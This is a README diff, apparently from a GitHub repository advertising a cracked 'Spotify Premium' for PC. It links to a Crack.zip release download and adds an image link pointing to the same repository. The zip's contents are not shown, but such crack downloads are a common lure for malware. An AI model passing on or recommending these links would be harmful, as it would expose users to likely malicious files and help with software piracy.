@@ -1,6 +1,6 @@
 # [Download Spotify-Premium-Crack-For-PC](https://github.com/staun5/Spotify-Premium-Crack-For-PC-2024-LifeTime-Licence/releases/download/Download/Crack.zip)
 
-[![1]()]()
+[![1]()](https://github.com/staun5/Spotify-Premium-Crack-For-PC-2024-LifeTime-Licence/releases/download/Download/109779378-dc420f00-7c40-11eb-8542-e35e9ce022ed.png)
 
 ## Features Cracked Spotify Premium For PC:
 
